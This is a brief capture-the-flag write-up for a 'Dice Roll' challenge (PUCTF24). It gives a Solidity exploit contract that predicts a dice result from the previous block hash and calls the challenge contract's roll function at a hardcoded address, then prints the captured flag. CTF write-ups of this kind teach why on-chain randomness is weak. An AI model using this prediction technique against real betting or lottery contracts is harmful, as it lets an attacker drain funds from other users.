## Dice Roll 擲骰仔

need to guess number generated using block number<br>
=> google with source code<br>
=> find this is code from other CTF<br>
=> write bot following old writeup<br>

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface DiceRollInterface {
    function roll(uint256 _guess) external returns (bool);
}

/*
 * @custom:dev-run-script ./scripts/deploy_with_ethers.ts
 */
contract Exploit {
    uint256 lastHash;
    uint256 ram = 2023;
    DiceRollInterface victim = DiceRollInterface(0x7a0B9f9A1AB0fa2CEcBD30AA4C07A70242F67143);

    function Attack() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        if (lastHash == blockValue) {
         revert();
        }
        lastHash = blockValue;
        uint256 diceRoll = blockValue / ram % 6;
        return victim.roll(diceRoll);
    }
}
```

PUCTF24{n0_r3n4omn3ss_1n_bl0ckch41n_vuLptYG7wexbBQ8ZvtYhGU2MdW4uT7po}
